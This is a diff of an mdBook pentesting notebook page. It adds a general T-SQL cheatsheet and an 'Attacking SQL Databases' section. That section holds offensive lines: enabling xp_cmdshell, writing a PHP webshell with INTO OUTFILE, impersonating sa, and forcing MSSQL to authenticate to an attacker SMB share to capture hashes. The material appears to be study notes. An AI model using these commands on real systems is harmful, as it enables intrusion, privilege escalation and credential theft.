@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-1b3cc894.js";
+            window.path_to_searchindex_js = "searchindex-ce326670.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-861b3ff5.js"></script>
+        <script src="toc-0412fd45.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -200,7 +200,6 @@
 <li><a href="#ranger-cheatsheet">Ranger</a></li>
 <li><a href="#metasploit-cheatsheet">Metasploit</a></li>
 <li><a href="#regex-cheatsheet">Regex</a></li>
-<li><a href="#sql-cheat-sheet">SQL</a></li>
 <li><a href="#multi-line-strings">yaml</a></li>
 <li><a href="#ffuf-cheatsheet">ffuf</a></li>
 <li><a href="#hashcat-cheatsheet">hashcat</a></li>
@@ -220,6 +219,7 @@
 <li><a href="#unshadow-cheatsheet">unshadow</a></li>
 <li><a href="#rubeus-cheatsheet">rubeus</a></li>
 <li><a href="#ssh-cheatsheet">ssh</a></li>
+<li><a href="#t-sql-cheatsheet">tsql</a></li>
 <li><a href="#crackmapexec-cme-cheatsheet">crackmapexec</a></li>
 <li><a href="#enum4linux-cheatsheet">enum4linux</a></li>
 <li><a href="#impacket-cheatsheet">impacket</a></li>
@@ -599,13 +599,14 @@
 <li><a href="infosec/README.html">InfoSec</a>
 <ul>
 <li><a href="#attacking-smb">attacking-smb</a></li>
+<li><a href="#attacking-sql-databases">attacking-sql-databases</a></li>
 <li><a href="#cracking-protected-files-and-archives">cracking-protected-files</a></li>
 <li><a href="#crawling">crawling</a></li>
 <li><a href="#robotstxt">robots.text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
 <li><a href="#shells-and-payloads">shell-payloads</a></li>
 <li><a href="#well-known-uris">well-known-uris</a></li>
-<li><a href="#enumeration-2">Enumeration</a></li>
+<li><a href="#enumeration-3">Enumeration</a></li>
 <li><a href="#footprinting-9">footprinting</a></li>
 <li><a href="#hydra-1">Brute-Forcing</a></li>
 <li><a href="#cve-common-vulnerabilities-and-exposures">CVE</a></li>
@@ -675,8 +676,8 @@
 <li><a href="#server-side-template-injection">server-side template injection</a></li>
 <li><a href="#smbclient-cheatsheet">smbclient</a></li>
 <li><a href="#smbmap-cheatsheet">smbmap</a></li>
-<li><a href="#sql-cheat-sheet">sql</a></li>
 <li><a href="#ssh-cheatsheet">ssh</a></li>
+<li><a href="#t-sql-cheatsheet">tsql</a></li>
 <li><a href="#unshadow-cheatsheet">unshadow</a></li>
 <li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
 <li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
@@ -2114,22 +2115,6 @@ Jobs
 </ul>
 <h2 id="useful-links"><a class="header" href="#useful-links">Useful links</a></h2>
 <p>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions/Cheatsheet</p>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="sql-cheat-sheet"><a class="header" href="#sql-cheat-sheet">SQL Cheat Sheet</a></h1>
-<h1 id="who-has-a-role"><a class="header" href="#who-has-a-role">Who has a role:</a></h1>
-<pre><code> select @@ServerName [Server Name], DB_NAME() [DB Name], u.name [DB Role], u2.name [Member Name]
-    from sys.database_role_members m
-    join sys.database_principals u on m.role_principal_id = u.principal_id
-    join sys.database_principals u2 on m.member_principal_id = u2.principal_id
-    where u.name = 'db_owner'
-    order by [Member Name]
-</code></pre>
-<h1 id="who-logged-in-as-dbo"><a class="header" href="#who-logged-in-as-dbo">Who logged in as dbo:</a></h1>
-<pre><code>#in user database run the command 
-SELECT name, sid FROM sys.sysusers where name = 'dbo' . 
-#in master database run the command 
-SELECT name, sid FROM sys.sql_logins
-</code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="multi-line-strings"><a class="header" href="#multi-line-strings">multi-line strings</a></h1>
 <p>There are 9 (or 63*, depending how you count) different ways to write multi-line strings in YAML.</p>
@@ -4494,6 +4479,357 @@ redis-cli -h localhost
 Host *
     ServerAliveInterval 60
     ServerAliveCountMax 3
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="t-sql-cheatsheet"><a class="header" href="#t-sql-cheatsheet">T-SQL Cheatsheet</a></h1>
+<h2 id="connecting"><a class="header" href="#connecting">Connecting</a></h2>
+<pre><code class="language-bash"># sqlcmd (Windows/Linux)
+sqlcmd -S &lt;server&gt; -U &lt;user&gt; -P '&lt;password&gt;'
+sqlcmd -S &lt;server&gt; -E  # Windows auth
+
+# From Linux
+sqsh -S &lt;server&gt; -U &lt;user&gt; -P '&lt;password&gt;'
+mssqlclient.py &lt;user&gt;@&lt;server&gt; -p 1433
+</code></pre>
+<h2 id="database-operations"><a class="header" href="#database-operations">Database Operations</a></h2>
+<pre><code class="language-sql">-- List databases
+SELECT name FROM sys.databases;
+
+-- Use database
+USE &lt;database_name&gt;;
+
+-- Create database
+CREATE DATABASE mydb;
+
+-- Drop database
+DROP DATABASE mydb;
+
+-- Current database
+SELECT DB_NAME();
+</code></pre>
+<h2 id="table-operations"><a class="header" href="#table-operations">Table Operations</a></h2>
+<pre><code class="language-sql">-- List tables
+SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
+SELECT name FROM sys.tables;
+
+-- Describe table structure
+EXEC sp_columns @table_name = 'TableName';
+SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'TableName';
+
+-- Create table
+CREATE TABLE users (
+    id INT PRIMARY KEY IDENTITY(1,1),
+    username NVARCHAR(50) NOT NULL,
+    email NVARCHAR(100),
+    created_at DATETIME DEFAULT GETDATE()
+);
+
+-- Drop table
+DROP TABLE users;
+
+-- Truncate (delete all rows, reset identity)
+TRUNCATE TABLE users;
+</code></pre>
+<h2 id="crud-operations"><a class="header" href="#crud-operations">CRUD Operations</a></h2>
+<pre><code class="language-sql">-- Insert
+INSERT INTO users (username, email) VALUES ('john', 'john@example.com');
+INSERT INTO users (username, email) VALUES 
+    ('alice', 'alice@example.com'),
+    ('bob', 'bob@example.com');
+
+-- Select
+SELECT * FROM users;
+SELECT TOP 10 * FROM users;
+SELECT username, email FROM users WHERE id &gt; 5;
+SELECT DISTINCT username FROM users;
+
+-- Update
+UPDATE users SET email = 'new@example.com' WHERE username = 'john';
+
+-- Delete
+DELETE FROM users WHERE id = 5;
+</code></pre>
+<h2 id="filtering--sorting"><a class="header" href="#filtering--sorting">Filtering &amp; Sorting</a></h2>
+<pre><code class="language-sql">-- WHERE clauses
+WHERE column = 'value'
+WHERE column &lt;&gt; 'value'
+WHERE column IN ('a', 'b', 'c')
+WHERE column NOT IN ('a', 'b')
+WHERE column BETWEEN 1 AND 100
+WHERE column LIKE 'prefix%'
+WHERE column LIKE '%suffix'
+WHERE column LIKE '%contains%'
+WHERE column IS NULL
+WHERE column IS NOT NULL
+
+-- Sorting
+ORDER BY column ASC
+ORDER BY column DESC
+ORDER BY col1, col2 DESC
+
+-- Pagination
+SELECT * FROM users ORDER BY id
+OFFSET 10 ROWS FETCH NEXT 10 ROWS ONLY;
+</code></pre>
+<h2 id="joins"><a class="header" href="#joins">Joins</a></h2>
+<pre><code class="language-sql">-- Inner join
+SELECT u.username, o.order_id
+FROM users u
+INNER JOIN orders o ON u.id = o.user_id;
+
+-- Left join (all from left, matching from right)
+SELECT u.username, o.order_id
+FROM users u
+LEFT JOIN orders o ON u.id = o.user_id;
+
+-- Right join
+SELECT u.username, o.order_id
+FROM users u
+RIGHT JOIN orders o ON u.id = o.user_id;
+
+-- Full outer join
+SELECT u.username, o.order_id
+FROM users u
+FULL OUTER JOIN orders o ON u.id = o.user_id;
+
+-- Cross join (cartesian product)
+SELECT * FROM table1 CROSS JOIN table2;
+</code></pre>
+<h2 id="aggregation"><a class="header" href="#aggregation">Aggregation</a></h2>
+<pre><code class="language-sql">SELECT COUNT(*) FROM users;
+SELECT COUNT(DISTINCT username) FROM users;
+SELECT SUM(amount) FROM orders;
+SELECT AVG(amount) FROM orders;
+SELECT MIN(amount), MAX(amount) FROM orders;
+
+-- Group by
+SELECT status, COUNT(*) as count
+FROM orders
+GROUP BY status;
+
+-- Having (filter after grouping)
+SELECT status, COUNT(*) as count
+FROM orders
+GROUP BY status
+HAVING COUNT(*) &gt; 10;
+</code></pre>
+<h2 id="string-functions"><a class="header" href="#string-functions">String Functions</a></h2>
+<pre><code class="language-sql">LEN('string')              -- Length
+UPPER('string')            -- Uppercase
+LOWER('STRING')            -- Lowercase
+LTRIM('  string')          -- Trim left
+RTRIM('string  ')          -- Trim right
+TRIM('  string  ')         -- Trim both (SQL Server 2017+)
+SUBSTRING('string', 1, 3)  -- Extract substring (1-indexed)
+LEFT('string', 3)          -- First n chars
+RIGHT('string', 3)         -- Last n chars
+REPLACE('string', 'i', 'o') -- Replace
+CHARINDEX('r', 'string')   -- Find position
+CONCAT('a', 'b', 'c')      -- Concatenate
+STUFF('string', 2, 3, 'X') -- Replace at position
+</code></pre>
+<h2 id="date-functions"><a class="header" href="#date-functions">Date Functions</a></h2>
+<pre><code class="language-sql">GETDATE()                  -- Current datetime
+GETUTCDATE()               -- Current UTC datetime
+SYSDATETIME()              -- Higher precision datetime
+DATEADD(day, 7, GETDATE()) -- Add interval
+DATEDIFF(day, date1, date2) -- Difference between dates
+DATEPART(year, GETDATE())  -- Extract part
+YEAR(date), MONTH(date), DAY(date) -- Extract components
+FORMAT(GETDATE(), 'yyyy-MM-dd') -- Format date
+CONVERT(DATE, GETDATE())   -- Convert to date only
+CAST('2024-01-01' AS DATE) -- Cast string to date
+</code></pre>
+<h2 id="variables--control-flow"><a class="header" href="#variables--control-flow">Variables &amp; Control Flow</a></h2>
+<pre><code class="language-sql">-- Variables
+DECLARE @name NVARCHAR(50) = 'value';
+DECLARE @count INT;
+SET @count = 10;
+SELECT @count = COUNT(*) FROM users;
+
+-- If/Else
+IF @count &gt; 0
+BEGIN
+    PRINT 'Has records';
+END
+ELSE
+BEGIN
+    PRINT 'No records';
+END
+
+-- Case
+SELECT username,
+    CASE 
+        WHEN status = 1 THEN 'Active'
+        WHEN status = 0 THEN 'Inactive'
+        ELSE 'Unknown'
+    END AS status_text
+FROM users;
+
+-- While loop
+DECLARE @i INT = 0;
+WHILE @i &lt; 10
+BEGIN
+    PRINT @i;
+    SET @i = @i + 1;
+END
+</code></pre>
+<h2 id="stored-procedures"><a class="header" href="#stored-procedures">Stored Procedures</a></h2>
+<pre><code class="language-sql">-- Create procedure
+CREATE PROCEDURE GetUserById
+    @UserId INT
+AS
+BEGIN
+    SELECT * FROM users WHERE id = @UserId;
+END;
+
+-- Execute
+EXEC GetUserById @UserId = 5;
+
+-- With output parameter
+CREATE PROCEDURE GetUserCount
+    @Count INT OUTPUT
+AS
+BEGIN
+    SELECT @Count = COUNT(*) FROM users;
+END;
+
+DECLARE @result INT;
+EXEC GetUserCount @Count = @result OUTPUT;
+PRINT @result;
+
+-- Drop procedure
+DROP PROCEDURE GetUserById;
+</code></pre>
+<h2 id="common-table-expressions-cte"><a class="header" href="#common-table-expressions-cte">Common Table Expressions (CTE)</a></h2>
+<pre><code class="language-sql">WITH ActiveUsers AS (
+    SELECT * FROM users WHERE status = 1
+)
+SELECT * FROM ActiveUsers WHERE created_at &gt; '2024-01-01';
+
+-- Recursive CTE
+WITH Numbers AS (
+    SELECT 1 AS n
+    UNION ALL
+    SELECT n + 1 FROM Numbers WHERE n &lt; 10
+)
+SELECT * FROM Numbers;
+</code></pre>
+<h2 id="transactions"><a class="header" href="#transactions">Transactions</a></h2>
+<pre><code class="language-sql">BEGIN TRANSACTION;
+
+UPDATE accounts SET balance = balance - 100 WHERE id = 1;
+UPDATE accounts SET balance = balance + 100 WHERE id = 2;
+
+-- Check and commit or rollback
+IF @@ERROR = 0
+    COMMIT;
+ELSE
+    ROLLBACK;
+
+-- Try/Catch
+BEGIN TRY
+    BEGIN TRANSACTION;
+    -- statements
+    COMMIT;
+END TRY
+BEGIN CATCH
+    ROLLBACK;
+    PRINT ERROR_MESSAGE();
+END CATCH;
+</code></pre>
+<h2 id="indexes"><a class="header" href="#indexes">Indexes</a></h2>
+<pre><code class="language-sql">-- Create index
+CREATE INDEX idx_username ON users(username);
+CREATE UNIQUE INDEX idx_email ON users(email);
+CREATE INDEX idx_composite ON users(lastname, firstname);
+
+-- Drop index
+DROP INDEX idx_username ON users;
+
+-- Show indexes
+EXEC sp_helpindex 'users';
+</code></pre>
+<h2 id="views"><a class="header" href="#views">Views</a></h2>
+<pre><code class="language-sql">-- Create view
+CREATE VIEW active_users AS
+SELECT id, username, email
+FROM users
+WHERE status = 1;
+
+-- Query view
+SELECT * FROM active_users;
+
+-- Drop view
+DROP VIEW active_users;
+</code></pre>
+<h2 id="user--permission-management"><a class="header" href="#user--permission-management">User &amp; Permission Management</a></h2>
+<pre><code class="language-sql">-- Create login (server level)
+CREATE LOGIN mylogin WITH PASSWORD = 'SecurePass123!';
+
+-- Create user (database level)
+CREATE USER myuser FOR LOGIN mylogin;
+
+-- Grant permissions
+GRANT SELECT ON users TO myuser;
+GRANT SELECT, INSERT, UPDATE ON users TO myuser;
+GRANT EXECUTE ON GetUserById TO myuser;
+
+-- Revoke permissions
+REVOKE SELECT ON users FROM myuser;
+
+-- Add to role
+ALTER ROLE db_datareader ADD MEMBER myuser;
+
+-- Check current user
+SELECT SYSTEM_USER;  -- Login name
+SELECT USER_NAME();  -- Database user
+
+-- Check role membership
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT IS_MEMBER('db_owner');
+</code></pre>
+<h2 id="system-information"><a class="header" href="#system-information">System Information</a></h2>
+<pre><code class="language-sql">-- Server info
+SELECT @@VERSION;
+SELECT @@SERVERNAME;
+SELECT SERVERPROPERTY('ProductVersion');
+
+-- Current session
+SELECT @@SPID;           -- Session ID
+SELECT SUSER_SNAME();    -- Login name
+SELECT DB_NAME();        -- Current database
+
+-- List all logins
+SELECT name, type_desc FROM sys.server_principals;
+
+-- List database users
+SELECT name, type_desc FROM sys.database_principals;
+
+-- Linked servers
+SELECT * FROM sys.servers;
+</code></pre>
+<h2 id="useful-system-procedures"><a class="header" href="#useful-system-procedures">Useful System Procedures</a></h2>
+<pre><code class="language-sql">EXEC sp_databases;              -- List databases
+EXEC sp_tables;                 -- List tables
+EXEC sp_columns 'TableName';    -- Table columns
+EXEC sp_helptext 'ProcName';    -- View proc definition
+EXEC sp_who2;                   -- Active connections
+EXEC sp_configure;              -- Server configuration
+</code></pre>
+<h1 id="who-has-a-role"><a class="header" href="#who-has-a-role">Who has a role:</a></h1>
+<pre><code> select @@ServerName [Server Name], DB_NAME() [DB Name], u.name [DB Role], u2.name [Member Name]
+    from sys.database_role_members m
+    join sys.database_principals u on m.role_principal_id = u.principal_id
+    join sys.database_principals u2 on m.member_principal_id = u2.principal_id
+    where u.name = 'db_owner'
+    order by [Member Name]
+</code></pre>
+<h1 id="who-logged-in-as-dbo"><a class="header" href="#who-logged-in-as-dbo">Who logged in as dbo:</a></h1>
+<pre><code>#in user database run the command 
+SELECT name, sid FROM sys.sysusers where name = 'dbo' . 
+#in master database run the command 
+SELECT name, sid FROM sys.sql_logins
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="crackmapexec-cme-cheatsheet"><a class="header" href="#crackmapexec-cme-cheatsheet">CrackMapExec (CME) Cheatsheet</a></h1>
@@ -30380,7 +30716,8 @@ ac
 <h3 id="generic"><a class="header" href="#generic">Generic</a></h3>
 <ul>
 <li><a href="#attacking-smb">attacking-smb</a></li>
-<li><a href="#enumeration-2">enumeration</a></li>
+<li><a href="#attacking-sql-databases">attacking-sql-databases</a></li>
+<li><a href="#enumeration-3">enumeration</a></li>
 <li><a href="#crawling">crawling</a></li>
 <li><a href="infosec/robots-text.html">robots-text</a></li>
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
@@ -30592,6 +30929,116 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powersh
 <li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
 <li><a href="https://github.com/lgandx/Responder">Responder</a></li>
 <li><a href="https://www.sans.org">SANS SMB Access from Linux Cheat Sheet</a></li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="attacking-sql-databases"><a class="header" href="#attacking-sql-databases">Attacking SQL Databases</a></h1>
+<h2 id="overview-13"><a class="header" href="#overview-13">Overview</a></h2>
+<p>MySQL and MSSQL are high-value targets storing sensitive data (credentials, PII, payment info). Often configured with highly privileged users, enabling lateral movement and privilege escalation.</p>
+<h2 id="default-ports"><a class="header" href="#default-ports">Default Ports</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Service</th><th>Port</th></tr>
+</thead>
+<tbody>
+<tr><td>MSSQL</td><td>TCP/1433, UDP/1434</td></tr>
+<tr><td>MSSQL (hidden)</td><td>TCP/2433</td></tr>
+<tr><td>MySQL</td><td>TCP/3306</td></tr>
+</tbody>
+</table>
+</div>
+<h2 id="enumeration-2"><a class="header" href="#enumeration-2">Enumeration</a></h2>
+<pre><code class="language-bash"># Banner grabbing with Nmap
+nmap -Pn -sV -sC -p1433 &lt;target&gt;
+</code></pre>
+<h2 id="authentication-6"><a class="header" href="#authentication-6">Authentication</a></h2>
+<p><strong>MSSQL Modes:</strong></p>
+<ul>
+<li><strong>Windows Authentication</strong> - Integrated with AD, trusted Windows accounts</li>
+<li><strong>Mixed Mode</strong> - Both Windows and SQL Server username/password</li>
+</ul>
+<p><strong>MySQL:</strong> Supports username/password and Windows auth (via plugin)</p>
+<p><strong>Notable Vuln:</strong> CVE-2012-2122 - MySQL 5.6.x timing attack allowing auth bypass</p>
+<h2 id="connecting-to-databases"><a class="header" href="#connecting-to-databases">Connecting to Databases</a></h2>
+<pre><code class="language-bash"># MySQL
+mysql -u &lt;user&gt; -p&lt;password&gt; -h &lt;host&gt;
+
+# MSSQL from Linux
+sqsh -S &lt;host&gt; -U &lt;user&gt; -P '&lt;password&gt;' -h
+mssqlclient.py -p 1433 &lt;user&gt;@&lt;host&gt;
+
+# MSSQL from Windows
+sqlcmd -S &lt;host&gt; -U &lt;user&gt; -P '&lt;password&gt;' -y 30 -Y 30
+</code></pre>
+<h2 id="command-execution-2"><a class="header" href="#command-execution-2">Command Execution</a></h2>
+<h3 id="mssql---xp_cmdshell"><a class="header" href="#mssql---xp_cmdshell">MSSQL - xp_cmdshell</a></h3>
+<pre><code class="language-sql">-- Execute commands
+xp_cmdshell 'whoami'
+GO
+
+-- Enable xp_cmdshell if disabled
+EXECUTE sp_configure 'show advanced options', 1
+GO
+RECONFIGURE
+GO
+EXECUTE sp_configure 'xp_cmdshell', 1
+GO
+RECONFIGURE
+GO
+</code></pre>
+<h3 id="mysql---write-webshell"><a class="header" href="#mysql---write-webshell">MySQL - Write Webshell</a></h3>
+<pre><code class="language-sql">SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php';
+</code></pre>
+<p>Check <code>secure_file_priv</code> variable - if empty, read/write is unrestricted.</p>
+<h2 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h2>
+<h3 id="mssql-user-impersonation"><a class="header" href="#mssql-user-impersonation">MSSQL User Impersonation</a></h3>
+<pre><code class="language-sql">-- Find users we can impersonate
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+GO
+
+-- Check current role
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+
+-- Impersonate user
+EXECUTE AS LOGIN = 'sa'
+GO
+
+-- Revert to original user
+REVERT
+GO
+</code></pre>
+<h2 id="lateral-movement---linked-servers"><a class="header" href="#lateral-movement---linked-servers">Lateral Movement - Linked Servers</a></h2>
+<pre><code class="language-sql">-- Identify linked servers
+SELECT srvname, isremote FROM sysservers
+GO
+
+-- Execute on linked server
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+GO
+</code></pre>
+<h2 id="hash-stealing-mssql"><a class="header" href="#hash-stealing-mssql">Hash Stealing (MSSQL)</a></h2>
+<pre><code class="language-sql">-- Force MSSQL to authenticate to attacker SMB share
+EXEC master..xp_dirtree '\\&lt;attacker_ip&gt;\share\'
+GO
+</code></pre>
+<p>Capture with:</p>
+<pre><code class="language-bash">sudo impacket-smbserver share ./ -smb2support
+</code></pre>
+<h2 id="key-capabilities-with-db-access"><a class="header" href="#key-capabilities-with-db-access">Key Capabilities with DB Access</a></h2>
+<ul>
+<li>Read/modify database contents</li>
+<li>Read/change server configuration</li>
+<li>Execute OS commands</li>
+<li>Read local files</li>
+<li>Capture local system hashes</li>
+<li>Impersonate users</li>
+<li>Pivot to linked servers</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="cracking-protected-files-and-archives"><a class="header" href="#cracking-protected-files-and-archives">Cracking Protected Files and Archives</a></h1>
@@ -30895,7 +31342,7 @@ sudo umount /media/bitlocker
 <p>Each method has its advantages and disadvantages depending on the use case.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="robotstxt"><a class="header" href="#robotstxt">robots.txt</a></h1>
-<h2 id="overview-13"><a class="header" href="#overview-13">Overview</a></h2>
+<h2 id="overview-14"><a class="header" href="#overview-14">Overview</a></h2>
 <p>Imagine you’re a guest at a grand house party. While you’re free to mingle and explore, there might be certain rooms marked “Private” that you’re expected to avoid. This is akin to how <code>robots.txt</code> functions in the world of web crawling. It acts as a virtual “etiquette guide” for bots, outlining which areas of a website they are allowed to access and which are off-limits.</p>
 <h2 id="what-is-robotstxt"><a class="header" href="#what-is-robotstxt">What is robots.txt?</a></h2>
 <p>Technically, <code>robots.txt</code> is a simple text file placed in the root directory of a website (e.g., <code>www.example.com/robots.txt</code>). It adheres to the Robots Exclusion Standard, guidelines for how web crawlers should behave when visiting a website. This file contains instructions in the form of “directives” that tell bots which parts of the website they can and cannot crawl.</p>
@@ -31047,7 +31494,7 @@ find . -exec /bin/sh \; -quit
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="well-known-uris"><a class="header" href="#well-known-uris">Well-Known URIs</a></h1>
-<h2 id="overview-14"><a class="header" href="#overview-14">Overview</a></h2>
+<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
 <p>The <code>.well-known</code> standard, defined in RFC 8615, serves as a standardized directory within a website’s root domain. This designated location, typically accessible via the <code>/.well-known/</code> path on a web server, centralizes a website’s critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.</p>
 <p>By establishing a consistent location for such data, <code>.well-known</code> simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website’s security policy, a client would request <code>https://example.com/.well-known/security.txt</code>.</p>
 <p>The Internet Assigned Numbers Authority (IANA) maintains a registry of <code>.well-known</code> URIs, each serving a specific purpose defined by various specifications and standards.</p>
@@ -31100,7 +31547,7 @@ find . -exec /bin/sh \; -quit
 <h2 id="reconnaissance-strategy"><a class="header" href="#reconnaissance-strategy">Reconnaissance Strategy</a></h2>
 <p>Exploring the IANA Registry and experimenting with the various <code>.well-known</code> URIs is an invaluable approach to uncovering additional web reconnaissance opportunities. As demonstrated with the <code>openid-configuration</code> endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website’s security landscape.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="enumeration-2"><a class="header" href="#enumeration-2">Enumeration</a></h1>
+<h1 id="enumeration-3"><a class="header" href="#enumeration-3">Enumeration</a></h1>
 <h2 id="principles-of-enumeration"><a class="header" href="#principles-of-enumeration">Principles of Enumeration</a></h2>
 <ul>
 <li>Enumeration is the systematic process of gathering information about a target system or network to identify potential vulnerabilities and entry points. There are two methods of enumeration: active and passive.</li>
@@ -31930,7 +32377,7 @@ Authorization: Basic YWxpY2U6c2VjcmV0MTIz
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="laudanum"><a class="header" href="#laudanum">Laudanum</a></h1>
-<h2 id="overview-15"><a class="header" href="#overview-15">Overview</a></h2>
+<h2 id="overview-16"><a class="header" href="#overview-16">Overview</a></h2>
 <p>Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell. It is designed to be easy to use and customizable for different scenarios.</p>
 <p>Laudanum can be downloaded here: https://github.com/jbarcia/Web-Shells/tree/master/laudanum</p>
 <h2 id="using-laudanum"><a class="header" href="#using-laudanum">Using Laudanum</a></h2>
@@ -32383,7 +32830,7 @@ https://www.microsoft.com/en-us/msrc/blog/2014/06/an-overview-of-kb2871997
 https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="attacking-windows-credential-manager"><a class="header" href="#attacking-windows-credential-manager">Attacking Windows Credential Manager</a></h1>
-<h2 id="overview-16"><a class="header" href="#overview-16">Overview</a></h2>
+<h2 id="overview-17"><a class="header" href="#overview-17">Overview</a></h2>
 <p>Windows Credential Manager is a built-in feature (since Server 2008 R2 / Windows 7) that allows users and applications to securely store credentials for other systems and websites. Credentials are stored in encrypted folders protected by DPAPI.</p>
 <h2 id="credential-storage-locations-1"><a class="header" href="#credential-storage-locations-1">Credential Storage Locations</a></h2>
 <div class="table-wrapper">
